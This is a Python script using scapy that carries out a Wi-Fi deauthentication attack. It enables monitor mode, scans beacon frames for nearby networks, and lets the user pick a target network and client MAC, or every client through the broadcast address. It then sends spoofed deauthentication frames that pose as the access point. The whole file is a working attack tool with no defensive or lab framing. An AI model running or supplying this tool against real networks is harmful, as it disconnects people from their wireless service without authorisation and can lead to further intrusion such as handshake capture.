import os
from scapy.all import *

def enable_monitor_mode(interface):

    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")
    
    print(f"Enabled monitor mode on {interface}")

def disable_monitor_mode(interface):
    
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type managed")
    os.system(f"sudo ip link set {interface} up")
    
    print(f"Disabled monitor mode on {interface}")

def scan_networks(interface):
    
    networks = []
    
    def packet_handler(packet):
        
        if packet.haslayer(Dot11Beacon):
            
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr2
            
            if ssid not in [net['ssid'] for net in networks]:
                
                networks.append({'ssid': ssid, 'bssid': bssid})

    print("Scanning for networks... Press Ctrl+C to stop.")
    
    sniff(iface = interface, prn = packet_handler, timeout = 30)

    print("\nAvailable networks:")
    
    for i, network in enumerate(networks):
        
        print(f"{i}: {network['ssid']} (BSSID: {network['bssid']})")

    return networks

def deauth_attack(target_mac, gateway_mac, interface):
    
    dot11 = Dot11(addr1 = target_mac, addr2 = gateway_mac, addr3 = gateway_mac)
    frame = RadioTap() / dot11 / Dot11Deauth(reason = 7)
    
    sendp(frame, iface = interface, count = 100, inter = 0.1)
    print(f"Sent deauth packets to {target_mac} from {gateway_mac}")

def main():
    
    interface = input("Enter the interface to use (e.g., wlan0): ")
    
    enable_monitor_mode(interface)
    
    try:

        networks = scan_networks(interface)
        
        if not networks:
    
            print("No networks found. Exiting.")
    
            return
        
        network_index = int(input("Select a network by its number: "))
        
        target_network = networks[network_index]
        
        target_mac = input("Enter the target MAC address (or 'all' to target all devices): ")
    
        if target_mac.lower() == 'all':
            target_mac = "FF:FF:FF:FF:FF:FF"
        
        gateway_mac = target_network['bssid']
        
        print(f"Starting deauth attack on {target_mac} from {gateway_mac} using {interface}")
        
        deauth_attack(target_mac, gateway_mac, interface)
        
    finally:

        disable_monitor_mode(interface)

if __name__ == "__main__":
    main()
